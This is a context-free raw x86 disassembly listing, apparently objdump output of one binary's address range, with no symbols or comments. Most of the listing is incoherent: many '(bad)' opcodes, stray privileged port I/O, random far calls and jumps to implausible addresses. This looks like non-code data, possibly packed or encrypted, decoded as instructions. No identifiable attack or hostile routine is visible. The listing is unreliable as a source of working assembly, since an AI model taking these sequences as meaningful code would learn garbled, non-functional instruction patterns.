  42fa3f:	jge    0x42fa7f
  42fa41:	jbe    0x42fa19
  42fa43:	mov    esi,DWORD PTR [esi]
  42fa45:	push   ss
  42fa46:	ficom  WORD PTR [edi+0x71a464ea]
  42fa4c:	outs   dx,BYTE PTR ds:[esi]
  42fa4d:	sar    BYTE PTR [edi+edx*4],cl
  42fa50:	(bad)  
  42fa51:	xchg   edx,eax
  42fa52:	scas   al,BYTE PTR es:[edi]
  42fa53:	call   0x7e8542
  42fa58:	jo     0x42fa1b
  42fa5a:	mov    bh,0x80
  42fa5c:	add    BYTE PTR [esi],bh
  42fa5e:	cwde   
  42fa5f:	jo     0x42fa73
  42fa61:	add    eax,0xbd1f8db0
  42fa66:	sbb    eax,0x96fd692d
  42fa6b:	(bad)  
  42fa6c:	jb     0x42fad9
  42fa6e:	sbb    dh,BYTE PTR [ecx]
  42fa70:	add    eax,ecx
  42fa72:	and    eax,0x4f86c060
  42fa77:	dec    eax
  42fa78:	sbb    BYTE PTR ds:0x1416f77,0x3c
  42fa7f:	push   eax
  42fa80:	push   0x4a3eec0
  42fa85:	mov    ebp,0x9f01f76
  42fa8a:	jbe    0x42facf
  42fa8c:	mov    bl,0xfb
  42fa8e:	cmp    DWORD PTR [ebp-0x62],ebp
  42fa91:	retf   0xcc72
  42fa94:	jecxz  0x42fa56
  42fa96:	fldcw  WORD PTR [ebp+0x223b6bf]
  42fa9c:	cmp    DWORD PTR ds:0x5233ed2f,eax
  42faa2:	out    dx,al
  42faa3:	out    0x58,al
  42faa5:	(bad)  
  42faa6:	out    dx,al
  42faa7:	adc    DWORD PTR [eax+0x41d95680],0x5b23d2ee
  42fab1:	pop    es
  42fab2:	adc    eax,0x9d9b2111
  42fab7:	ror    DWORD PTR [edx+eax*4+0x1f2e6fda],1
  42fabe:	aas    
  42fabf:	cmp    BYTE PTR [edi+edi*1+0x5a2f4fef],0xfd
  42fac7:	push   ebx
  42fac8:	push   ebp
  42fac9:	push   ecx
  42faca:	sbb    BYTE PTR [edi-0xab2db8a],ch
  42fad0:	scas   al,BYTE PTR es:[edi]
  42fad1:	dec    ebp
  42fad2:	push   ds
  42fad3:	call   0xaaf:0xa49072e
  42fada:	addr16 in al,0x3e
  42fadd:	sub    eax,0x30b88878
  42fae2:	push   ebp
  42fae3:	(bad)  
  42fae4:	test   BYTE PTR [ebx],0x71
  42fae7:	sub    edx,0xc68f8022
  42faed:	sub    eax,0x0
	...
  42fb56:	sbb    ebp,edi
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	sti    
  42fb63:	jge    0x42fbbf
  42fb65:	and    eax,0x1ff67
  42fb6a:	add    BYTE PTR [ecx],al
  42fb6c:	add    BYTE PTR [eax],al
  42fb6e:	setae  al
  42fb71:	lea    eax,[ebp-0x533fa574]
  42fb77:	(bad)  
  42fb79:	cli    
  42fb7a:	aas    
  42fb7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb7c:	retf   0xf549
  42fb7f:	jb     0x42fb52
  42fb81:	cli    
  42fb82:	dec    esp
  42fb83:	ret    
  42fb84:	(bad)  
  42fb85:	pop    ds
  42fb86:	call   0x6bab:0xf59b7fb4
  42fb8d:	mov    DWORD PTR [ebx+0x48],ebp
  42fb90:	hlt    
  42fb91:	(bad)  
  42fb92:	clc    
  42fb93:	fnstenv fs:[edx]
  42fb96:	cli    
  42fb97:	xchg   ebx,eax
  42fb98:	sti    
  42fb99:	mul    DWORD PTR [edi+0x76bb7a0c]
  42fb9f:	xchg   esp,eax
  42fba0:	mov    al,ds:0x36df8844
  42fba5:	fild   QWORD PTR [ecx]
  42fba7:	les    ecx,FWORD PTR [edi-0x7b]
  42fbaa:	jne    0x42fbdd
  42fbac:	fwait
  42fbad:	dec    esp
  42fbae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fbaf:	push   ebp
  42fbb0:	inc    esi
  42fbb1:	loopne 0x42fb3a
  42fbb3:	mov    esi,0x1b550b3d
  42fbb8:	and    bl,al
  42fbba:	adc    al,0x2a
  42fbbc:	imul   edi,esp,0x9ef6064d
  42fbc2:	outs   dx,DWORD PTR ds:[esi]
  42fbc3:	pusha  
  42fbc4:	inc    eax
  42fbc5:	(bad)  
  42fbc6:	and    al,0x7e
  42fbc8:	push   edx
  42fbc9:	sub    ah,bh
  42fbcb:	stc    
  42fbcc:	fcmovbe st,st(2)
  42fbce:	sar    DWORD PTR [ecx-0x4d],cl
  42fbd1:	repnz mov DWORD PTR [edi+0x63],eax
  42fbd5:	hlt    
  42fbd6:	mov    ds:0xb657efc4,al
  42fbdb:	jbe    0x42fbb4
  42fbdd:	inc    ebp
  42fbde:	dec    esp
  42fbdf:	sbb    DWORD PTR [ecx+0x26],ebx
  42fbe2:	iret   
  42fbe3:	dec    edx
  42fbe4:	std    
  42fbe5:	leave  
  42fbe6:	loope  0x42fbb9
  42fbe8:	jmp    0xf55:0xcbd34352
  42fbef:	or     DWORD PTR [eax+0x1f],eax
  42fbf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fbf3:	rcl    dl,0x38
  42fbf6:	mov    bh,0x8d
  42fbf8:	(bad)  
  42fbf9:	scas   al,BYTE PTR es:[edi]
  42fbfa:	fld    QWORD PTR [edi-0x6a]
  42fbfd:	adc    BYTE PTR [ecx-0x1b],cl
  42fc00:	aaa    
  42fc01:	mov    ecx,0x147c246d
  42fc06:	fisubr DWORD PTR [edx+eax*4-0x1898fb5e]
  42fc0d:	mul    DWORD PTR [ebx+0x50b8728]
  42fc13:	sub    eax,DWORD PTR [esi-0x4dcf5b5b]
  42fc19:	fild   DWORD PTR [ebp-0x7d]
  42fc1c:	adc    dl,0x1b
  42fc1f:	jl     0x42fc8c
  42fc21:	xchg   esp,eax
  42fc22:	cmp    eax,ebp
  42fc24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc25:	dec    ebp
  42fc26:	mov    ds:0x10674a84,eax
  42fc2b:	ror    edi,0x1
  42fc2e:	into   
  42fc2f:	mov    bh,BYTE PTR [ebp+0x5cbabf45]
  42fc35:	xchg   edi,eax
  42fc36:	push   ds
  42fc37:	mov    al,0x1e
  42fc39:	push   DWORD PTR [eax+0x6d]
  42fc3c:	inc    eax
  42fc3d:	js     0x42fcad
  42fc3f:	repnz daa 
  42fc41:	sub    BYTE PTR [ebp+0x3cfce4f2],bh
  42fc47:	mov    ?,edx
  42fc49:	sbb    DWORD PTR [edx],0xfffffff0
  42fc4c:	jmp    0x45335932
  42fc51:	push   cs
  42fc52:	push   es
  42fc53:	iret   
  42fc54:	(bad)  
  42fc55:	lahf   
  42fc56:	popa   
  42fc57:	sti    
  42fc58:	jno    0x42fbf8
  42fc5a:	xchg   BYTE PTR [edx-0x3a4c10a4],bh
  42fc60:	sub    bh,cl
  42fc62:	inc    edx
  42fc63:	outs   dx,DWORD PTR ds:[esi]
  42fc64:	push   ebx
  42fc65:	jae    0x42fbf5
  42fc67:	call   0xb0b7:0x42cc916a
	...
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    BYTE PTR [ecx],al
  42fce3:	xor    DWORD PTR [eax+0x2006714],eax
  42fce9:	add    BYTE PTR [eax],al
  42fceb:	add    DWORD PTR [eax],eax
  42fced:	add    BYTE PTR [esi+0x11d6564c],bl
  42fcf3:	lahf   
  42fcf4:	cmp    edx,DWORD PTR [ecx+0x67]
  42fcf7:	xor    DWORD PTR [esi+0x50],edi
  42fcfa:	jne    0x42fcf7
  42fcfc:	mov    cl,0x26
  42fcfe:	and    esi,DWORD PTR [eax]
  42fd00:	fs out dx,eax
  42fd02:	out    0xe3,eax
  42fd04:	test   eax,0xec04a354
  42fd09:	outs   dx,DWORD PTR ds:[esi]
  42fd0a:	mov    WORD PTR [edx],fs
  42fd0c:	fimul  DWORD PTR [edi+eiz*1+0x22]
  42fd10:	and    bh,BYTE PTR [ebp+0x1]
  42fd13:	pop    ebx
  42fd14:	je     0x42fd31
  42fd16:	push   eax
  42fd17:	cdq    
  42fd18:	jo     0x42fcc9
  42fd1a:	add    BYTE PTR [ebx+ecx*2-0x600dd3b],dl
  42fd21:	inc    ebx
  42fd22:	shl    DWORD PTR [eax-0x743d2670],cl
  42fd28:	loopne 0x42fd6b
  42fd2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd2b:	ret    0x671b
  42fd2e:	xchg   ebx,eax
  42fd2f:	xor    DWORD PTR [edi+0x467f636a],0x16
  42fd36:	xor    al,0xe4
  42fd38:	or     ebp,ebp
  42fd3a:	ds sbb eax,0xa6c9a507
  42fd40:	jge    0x42fd61
  42fd42:	sub    eax,0x7d392ff1
  42fd47:	sub    DWORD PTR [ebx+eiz*8-0x22fb2058],ebx
  42fd4e:	xchg   edx,eax
  42fd4f:	aaa    
  42fd50:	je     0x42fd4a
  42fd52:	mov    al,ds:0x62f65ae8
  42fd57:	shl    DWORD PTR [esi],cl
  42fd59:	fwait
  42fd5a:	mov    ecx,0x1e3df5fa
  42fd5f:	fidivr WORD PTR [esi-0x2c]
  42fd62:	hlt    
  42fd63:	inc    edx
  42fd64:	mov    BYTE PTR [edx],ch
  42fd66:	aaa    
  42fd67:	scas   eax,DWORD PTR es:[edi]
  42fd68:	jge    0x42fd87
  42fd6a:	loope  0x42fcf0
  42fd6c:	in     eax,0x5c
  42fd6e:	jle    0x42fd1e
  42fd70:	and    BYTE PTR [ebx],0x17
  42fd73:	out    0xdb,al
  42fd75:	pusha  
  42fd76:	ror    BYTE PTR [ebp-0xc279a44],0xba
  42fd7d:	gs icebp 
  42fd7f:	rcl    BYTE PTR [esi-0x7a11af4f],0x2c
  42fd86:	je     0x42fe03
  42fd88:	cs pop edx
  42fd8a:	pop    ebx
  42fd8b:	(bad)  
  42fd8c:	hlt    
  42fd8d:	xchg   ebx,eax
  42fd8e:	inc    esp
  42fd8f:	(bad)  
  42fd90:	call   0x3f7d:0x8e68a83a
  42fd97:	mov    edi,0xbd85a257
  42fd9c:	jnp    0x42fde7
  42fd9e:	ins    DWORD PTR es:[edi],dx
  42fd9f:	xor    al,0x2f
  42fda1:	dec    esi
  42fda3:	xchg   DWORD PTR [edi],eax
  42fda5:	into   
  42fda6:	dec    edx
  42fda7:	scas   al,BYTE PTR es:[edi]
  42fda8:	loopne 0x42fdd2
  42fdaa:	inc    edi
  42fdab:	clc    
  42fdac:	add    al,0x97
  42fdae:	push   esi
  42fdaf:	data16 jge 0x42fe1b
  42fdb2:	fucompp 
  42fdb4:	push   es
  42fdb5:	inc    ebp
  42fdb6:	pop    ebp
  42fdb7:	lds    esp,FWORD PTR [edi+0x52]
  42fdba:	fstp   TBYTE PTR [ebx+0x168cc05]
  42fdc0:	add    ebx,0x2193f662
  42fdc6:	out    0xbc,eax
  42fdc8:	enter  0xd6de,0x39
  42fdcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fdcd:	push   esp
  42fdce:	neg    esi
  42fdd0:	inc    edx
  42fdd1:	mov    edx,0xe46ef724
  42fdd6:	and    al,0x2f
  42fdd8:	pop    ds
  42fdd9:	add    dh,BYTE PTR [eax+0x5c]
  42fddc:	(bad)  
  42fddd:	(bad)  
  42fdde:	imul   ebp,DWORD PTR ds:0x8216f134,0xffffffd4
  42fde5:	leave  
  42fde6:	xchg   ebx,eax
  42fde7:	pop    ss
  42fde8:	xor    bx,cx
  42fdeb:	push   ss
  42fdec:	dec    edx
  42fded:	pop    DWORD PTR [eax]
	...
  42fe53:	add    BYTE PTR [eax],al
  42fe55:	add    BYTE PTR [eax-0x40],cl
  42fe58:	ret    0xcaf0
  42fe5b:	bnd jp 0x42fe56
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz inc edx
  42fe63:	outs   dx,BYTE PTR ds:[esi]
  42fe64:	mov    WORD PTR [ebx],gs
  42fe66:	add    DWORD PTR [bp+si],eax
  42fe69:	add    BYTE PTR [eax],al
  42fe6b:	add    DWORD PTR [eax],eax
  42fe6d:	add    BYTE PTR [ebp-0x14],ch
  42fe70:	int    0x39
  42fe72:	pop    esp
  42fe73:	enter  0xe35b,0xdc
  42fe77:	(bad)  
  42fe78:	sahf   
  42fe79:	inc    esi
  42fe7a:	inc    eax
  42fe7b:	out    0x93,eax
  42fe7d:	push   ss
  42fe7e:	scas   eax,DWORD PTR es:[edi]
  42fe7f:	popa   
  42fe80:	mov    eax,0x8b0d5911
  42fe85:	xchg   DWORD PTR [ebp+0x13],edi
  42fe88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe89:	sbb    ah,BYTE PTR [edi+0x3cc3b953]
  42fe8f:	mov    edi,0x25e19ee0
  42fe94:	xor    esp,ecx
  42fe96:	push   0xe
  42fe98:	mov    edx,0xbe1171a6
  42fe9d:	adc    al,0xd7
  42fe9f:	cmp    al,0x4d
  42fea1:	xor    BYTE PTR [ebx],bh
  42fea3:	push   0x0
  42fea5:	jg     0x42fe33
  42fea7:	ins    BYTE PTR es:[edi],dx
  42fea8:	sbb    ebp,esi
  42feaa:	sbb    BYTE PTR fs:[edx-0x4f],dh
  42feae:	or     edx,eax
  42feb0:	adc    edi,edi
  42feb2:	xchg   esp,eax
  42feb3:	aad    0xc2
  42feb5:	fst    DWORD PTR [ecx+0x5a3ac5f9]
  42febb:	imul   ebx,esi,0xffffffe9
  42febe:	mov    esp,0x602c63c1
  42fec3:	mov    bh,0x34
  42fec5:	jns    0x42ff15
  42fec7:	sub    DWORD PTR [ecx+0x440cec82],eax
  42fecd:	syscall 
  42fecf:	sub    edx,DWORD PTR [ebp+0x7c]
  42fed2:	cli    
  42fed3:	(bad)  
  42fed4:	fmul   QWORD PTR [eax-0x3812b5eb]
  42feda:	xor    al,0xb4
  42fedc:	fisubr DWORD PTR [ecx+edx*1]
  42fedf:	or     BYTE PTR [edi+0x7b3e2ee9],bl
  42fee5:	cdq    
  42fee6:	jo     0x42ff50
  42fee8:	stos   BYTE PTR es:[edi],al
  42fee9:	mov    eax,0x802fed4a
  42feee:	dec    eax
  42feef:	push   0x83e6bb58
  42fef4:	mov    ebx,0xad3c1783
  42fef9:	outs   dx,DWORD PTR ds:[esi]
  42fefa:	adc    dl,bl
  42fefc:	addr16 cmp al,0x66
  42feff:	fidivr WORD PTR [edi]
  42ff01:	add    al,BYTE PTR [edi-0x60]
  42ff04:	mov    bl,0x47
  42ff06:	es cdq 
  42ff08:	fstp   DWORD PTR [ebp-0x347c7d3f]
  42ff0e:	mov    eax,ds:0x9ddfdb78
  42ff13:	dec    ebp
  42ff14:	add    cl,BYTE PTR [ebx+0x40effbd6]
  42ff1a:	sub    esp,0x4cb6475a
  42ff20:	adc    al,0x1
  42ff22:	icebp  
  42ff23:	stos   BYTE PTR es:[edi],al
  42ff24:	pushf  
  42ff25:	in     eax,dx
  42ff26:	xlat   BYTE PTR ds:[ebx]
  42ff27:	frstor [esi-0x67a36301]
  42ff2d:	or     ecx,esi
  42ff2f:	out    0xf7,eax
  42ff31:	push   edx
  42ff32:	imul   esi,DWORD PTR [ecx+0xd468751],0x3b
  42ff39:	imul   edx,edi,0x61b7340d
  42ff3f:	aaa    
  42ff40:	int    0x3f
  42ff42:	int3   
  42ff43:	mov    eax,ds:0xaa0ab194
  42ff48:	retf   0x5343
  42ff4b:	lds    esi,FWORD PTR [ebx-0x51339d2a]
  42ff51:	inc    esp
  42ff52:	mov    bl,0xd
  42ff54:	sbb    edx,DWORD PTR [ecx-0x54e17178]
  42ff5a:	inc    ebx
  42ff5b:	sbb    ecx,DWORD PTR [esi-0x6f]
  42ff5e:	aad    0x9
  42ff60:	adc    DWORD PTR ds:0xc2d0153f,0xaa49f184
  42ff6a:	das    
  42ff6b:	ret    
  42ff6c:	add    eax,0xce
	...
  42ffd5:	add    BYTE PTR [edi+eiz*2],al
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [edi+eiz*4+0x2],0xf4
  42ffe5:	jg     0x43004e
  42ffe7:	add    al,BYTE PTR [edx]
  42ffe9:	add    BYTE PTR [ebp+0x1c000000],dl
  42ffef:	icebp  
  42fff0:	pop    es
  42fff1:	dec    ebx
  42fff2:	(bad)  
  42fff3:	stos   DWORD PTR es:[edi],eax
  42fff4:	push   edi
  42fff5:	test   edi,0xc93f65b1
  42fffb:	xchg   eax,edi
  42fffd:	sub    eax,0xe08d8b5c
  430002:	(bad)  
  430004:	ins    DWORD PTR es:[edi],dx
  430005:	add    esi,DWORD PTR [edi]
  430007:	mov    eax,0x624d6173
  43000c:	and    bl,BYTE PTR [eax+0x2101f5f2]
  430012:	sbb    BYTE PTR [esi+0x1847f06e],cl
  430018:	push   esp
  430019:	jge    0x42ffc6
  43001b:	call   0x59d4:0xf3f9f1e0
  430022:	mov    ah,0x3c
  430024:	fsubr  st,st(0)
  430026:	rcr    cl,cl
  430028:	xor    BYTE PTR [ebx],ah
  43002a:	stc    
  43002b:	pusha  
  43002c:	jp     0x42ffaf
  43002e:	adc    eax,edx
  430030:	mov    ds:0x6397a48,al
  430035:	sub    BYTE PTR [esi+eax*2+0x4],dl
  430039:	int    0xc0
  43003b:	and    bh,dl
  43003d:	inc    edi
  43003e:	mov    dl,0xde
  430040:	hlt    
  430041:	jl     0x42ffd6
  430043:	mov    esi,0xb20b8363
  430048:	scas   al,BYTE PTR es:[edi]
  430049:	into   
  43004a:	fsubr  QWORD PTR [ebx-0x6bc4faeb]
  430050:	arpl   WORD PTR [esi],bx
  430052:	push   edx
  430053:	je     0x42ffed
  430055:	add    al,0x25
  430057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430058:	mov    ds:0x564445fd,al
  43005d:	pop    ecx
  43005e:	sub    eax,0x750adcf3
  430063:	cmp    DWORD PTR [eax+0x3a],ebx
  430066:	jb     0x4300cb
  430068:	dec    ecx
  430069:	xchg   esi,eax
  43006a:	in     al,dx
  43006b:	push   ds
  43006c:	pop    ecx
  43006d:	jo     0x42ffef
  43006f:	add    BYTE PTR [esp+edx*1],bl
  430072:	xchg   edx,eax
  430073:	xchg   ebp,eax
  430074:	retf   
  430075:	jl     0x4300e2
  430077:	mov    eax,ds:0x717ace11
  43007c:	out    dx,al
  43007d:	mov    edx,0xbbe74fad
  430082:	sbb    eax,DWORD PTR [eax]
	...
  4300d4:	add    BYTE PTR [eax],al
  4300d6:	dec    ebp
  4300d7:	push   ebp
  4300d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4300de:	mov    esp,ebp
  4300e0:	or     al,ah
  4300e2:	dec    ebp
  4300e3:	add    bh,al
  4300e5:	add    BYTE PTR [eax],cl
  4300e7:	add    BYTE PTR [eax],al
  4300e9:	mov    DWORD PTR [eax],0x3ff44545
  4300ef:	xor    DWORD PTR [eax],eax
  4300f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4300f7:	(bad)  
  4300f8:	enter  0x4d45,0xb8
  4300fc:	mov    esi,DWORD PTR [edx]
  4300fe:	hlt    
  4300ff:	test   ebx,ecx
  430101:	pushf  
  430102:	enter  0x4df8,0x8b
  430106:	mov    DWORD PTR [ebp+0x8],0x894708
  43010d:	inc    ebp
  43010e:	mov    ebp,0xff8bfffc
  430113:	dec    ebp
  430114:	mov    ch,0xf4
  430116:	call   DWORD PTR [ebx-0x1]
  430119:	mov    ebx,0x8005426
  43011e:	call   DWORD PTR [ecx+0x8]
  430121:	pop    es
  430122:	jmp    0xb8:0x9cb4533
  430129:	fwait
  43012a:	mov    esi,DWORD PTR [edx-0xc]
  43012d:	xor    al,bl
  43012f:	add    BYTE PTR [ebx+0x3c83203],bl
  430135:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43013b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430141:	xor    eax,DWORD PTR [eax]
  430143:	retf   
  430144:	ret    
  430145:	add    eax,esi
  430147:	enter  0x8945,0x64
  43014b:	dec    ebp
  43014c:	sbb    ah,cl
  43014e:	add    BYTE PTR [ebx-0xb87b277],cl
  430154:	dec    DWORD PTR [ebx-0xbcfb275]
  43015a:	test   DWORD PTR [ebx],esi
  43015c:	dec    ebx
  43015e:	inc    DWORD PTR [ebx]
  430160:	inc    eax
  430161:	enter  0x8989,0x64
  430165:	(bad)  
  430166:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43016a:	cld    
  43016b:	dec    DWORD PTR [ebp-0xa90001]
  430171:	push   edi
  430172:	mov    BYTE PTR [edx+0x1],ch
  430175:	and    DWORD PTR [eax],eax
  430177:	pop    ecx
  430178:	inc    ebp
  430179:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43017f:	push   0xffffff89
  430181:	pop    ecx
  430182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430183:	dec    ebp
  430184:	add    BYTE PTR [ecx+0x45fc088b],cl
  43018a:	jne    0x4301d5
  43018c:	lea    eax,[eax]
  43018e:	fs (bad) 
  430190:	dec    DWORD PTR [eax]
  430192:	mov    DWORD PTR [eax],eax
  430194:	test   al,0x0
  430196:	add    BYTE PTR [ebp-0x18],cl
  430199:	xor    ebp,DWORD PTR [edx]
  43019b:	add    eax,DWORD PTR [eax]
  43019d:	mov    eax,eax
  43019f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301a6:	inc    ebp
  4301a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4301ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4301b3:	inc    eax
  4301b4:	cmp    bh,0x1
  4301b7:	lea    eax,[eax]
  4301b9:	and    BYTE PTR [eax],al
  4301bb:	inc    DWORD PTR [ecx-0x18]
  4301be:	mov    ecx,DWORD PTR [ebx]
  4301c0:	cld    
  4301c1:	add    BYTE PTR [ecx+0x75014d],cl
  4301c7:	(bad)  
  4301c8:	xchg   ebp,eax
  4301c9:	sar    bh,1
  4301cb:	inc    eax
  4301cc:	inc    DWORD PTR [eax]
  4301ce:	mov    eax,DWORD PTR [ebp-0x4]
  4301d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4301d7:	add    BYTE PTR [edx],dl
  4301d9:	(bad)  
  4301da:	nop
  4301db:	inc    ebp
  4301dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4301e2:	mov    al,0xff
  4301e4:	add    bh,bh
  4301e6:	add    BYTE PTR [ebx],dh
  4301e8:	inc    DWORD PTR [ebx]
  4301ea:	sbb    al,0x89
  4301ec:	jne    0x4301ca
  4301ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4301f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4301fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430201:	inc    DWORD PTR [ebp-0x75]
  430204:	fisttp QWORD PTR [esi+ebp*8]
  430207:	test   DWORD PTR [esi-0x1],esp
  43020a:	inc    ebp
  43020b:	(bad)  
  43020c:	aas    
  43020d:	inc    ebp
  43020e:	(bad)  
  43020f:	lea    edi,[eax+edi*2-0x1]
  430213:	inc    edi
  430215:	mov    DWORD PTR ds:0x8000c7a0,edi
  43021b:	mov    ebp,esp
  43021d:	cld    
  43021e:	loop   0x4301ad
  430220:	inc    ebp
  430221:	(bad)  
  430222:	out    dx,al
  430223:	(bad)  
  430224:	fisttp WORD PTR [eax+0x8801c7]
  43022a:	jecxz  0x430271
  43022c:	in     al,dx
  43022d:	inc    DWORD PTR [ebp-0x4]
  430230:	out    0x8d,eax
  430232:	aas    
  430233:	(bad)  
  430234:	call   0xcb2d38
  430239:	add    DWORD PTR [ebx-0x7f490400],ecx
  43023f:	add    BYTE PTR [ecx],al
  430241:	test   DWORD PTR [eax],eax
  430243:	wrmsr  
  430245:	ja     0x430242
  430247:	add    BYTE PTR [eax],al
  430249:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43024f:	add    esp,edi
  430251:	add    BYTE PTR [eax+0x450108],al
  430257:	mov    edi,DWORD PTR [ebp-0x6c]
  43025a:	add    DWORD PTR [eax],0x4
  43025d:	mov    eax,DWORD PTR [ebp+0x3]
  430260:	mov    edi,DWORD PTR [esp+edi*8]
  430263:	dec    ebp
  430264:	nop
  430265:	mov    eax,DWORD PTR [ecx]
  430267:	fadd   DWORD PTR [eax]
  430269:	add    BYTE PTR [ecx*4-0xafa000],dl
  430270:	inc    ebp
  430271:	push   edx
  430272:	call   DWORD PTR [ebp-0x7b]
  430275:	mov    esi,DWORD PTR [ebp-0x74]
  430278:	mov    eax,DWORD PTR [eax]
  43027a:	cld    
  43027b:	mov    eax,DWORD PTR [eax+0x880103]
  430281:	add    BYTE PTR [ebp+0x6a],bh
  430284:	cmp    edi,0x10
  430287:	mov    WORD PTR [ebp+0x0],es
  43028a:	mov    edx,DWORD PTR [edx-0x4]
  43028d:	push   ecx
  43028e:	nop
  43028f:	inc    DWORD PTR [ecx]
  430291:	cld    
  430292:	add    BYTE PTR [ebp-0x16],bh
  430295:	mov    eax,DWORD PTR [eax]
  430297:	cld    
  430298:	push   eax
  430299:	nop
  43029a:	inc    ebp
  43029b:	add    edi,edi
  43029d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4302a3:	jmp    0xe33b:0x9403c733
  4302aa:	movntq QWORD PTR [edx],mm7
  4302ad:	mov    DWORD PTR [eax],0xb87e8b98
  4302b3:	test   ebx,eax
  4302b5:	jmp    DWORD PTR [ebp-0x1]
  4302b8:	int    0xed
  4302ba:	sub    esp,esi
  4302bc:	add    eax,DWORD PTR [ebp-0x30]
  4302bf:	fild   WORD PTR [ebp+0x3f]
  4302c2:	cmp    eax,edi
  4302c4:	je     0xc043e8ea
  4302ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4302d1:	(bad)  
  4302d2:	jne    0x430260
  4302d4:	mov    ebx,ebp
  4302d6:	cld    
  4302d7:	jle    0x43031e
  4302d9:	dec    ecx
  4302da:	mov    eax,DWORD PTR [eax]
  4302dc:	mov    ah,0x50
  4302de:	add    BYTE PTR [ebp-0x18],al
  4302e1:	mov    ebp,DWORD PTR [ecx]
  4302e3:	test   al,0x0
  4302e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4302eb:	add    DWORD PTR es:[eax],eax
  4302ee:	add    al,al
  4302f0:	xor    BYTE PTR [eax+0x4f],dl
  4302f3:	inc    ebp
  4302f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4302fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430300:	add    DWORD PTR [ecx+0x458be845],ecx
  430306:	fmul   DWORD PTR [ebx+0x8bb800]
  43030c:	cld    
  43030d:	call   0xd82dd2
  430312:	dec    DWORD PTR [ebx+0x109ee8ff]
  430318:	add    al,al
  43031a:	push   eax
  43031b:	es inc ebp
  43031d:	inc    ebp
  43031e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430324:	dec    DWORD PTR [ebx-0x3ff70301]
  43032a:	mov    DWORD PTR gs:[eax],eax
  43032d:	call   0x8c134867
  430332:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430339:	sub    eax,ebx
  43033b:	add    BYTE PTR [eax],al
  43033d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430343:	inc    ebp
  430344:	push   ebp
  430345:	mov    ebp,eax
  430347:	shr    BYTE PTR [ecx],1
  430349:	ret    
  43034a:	add    dh,al
  43034c:	mov    eax,ecx
  43034e:	cld    
  43034f:	test   BYTE PTR [eax+0x101],al
  430355:	inc    ebp
  430356:	xor    BYTE PTR [ebx],dh
  430358:	push   edi
  430359:	mov    ecx,0xffe48d89
  43035e:	inc    ebp
  43035f:	enter  0x4d8b,0xfc
  430363:	mov    eax,ebx
  430365:	or     BYTE PTR [ebx+0x38732c1],bl
  43036b:	add    DWORD PTR [ebp-0xbac000],ecx
  430371:	add    al,ch
  430373:	add    BYTE PTR [ecx],ch
  430375:	inc    DWORD PTR [eax]
  430377:	cld    
  430378:	mov    edi,DWORD PTR [ebp-0xc]
  43037b:	mov    esi,DWORD PTR [ebp-0x4]
  43037e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430384:	and    BYTE PTR [ebp+0x50e800ff],bl
  43038a:	sub    DWORD PTR [ebp+0x0],eax
  43038d:	mov    edi,edi
  43038f:	test   al,0xe4
  430391:	add    BYTE PTR [ebp-0x1],cl
  430394:	xor    ebp,eax
  430396:	add    esp,DWORD PTR [esi]
  430398:	cmp    eax,DWORD PTR [eax]
  43039a:	jne    0x4303e9
  43039c:	(bad)  
  43039d:	mov    ebx,eax
  43039f:	pushf  
  4303a0:	add    BYTE PTR [eax],al
  4303a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4303a8:	or     BYTE PTR [eax+0x8401c3],bh
  4303ae:	fwait
  4303af:	jne    0x4303e3
  4303b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4303b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4303bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4303c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4303ca:	add    BYTE PTR [edi+0x45],dl
  4303cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4303d4:	gs test ebp,ecx
  4303d7:	je     0x430404
  4303d9:	mov    eax,DWORD PTR [ebx]
  4303db:	cld    
  4303dc:	sar    BYTE PTR [eax+0x3b0145],1
  4303e2:	pcmpeqw mm4,mm2
  4303e5:	xor    edi,edi
  4303e7:	lea    ecx,[ebx-0x23927470]
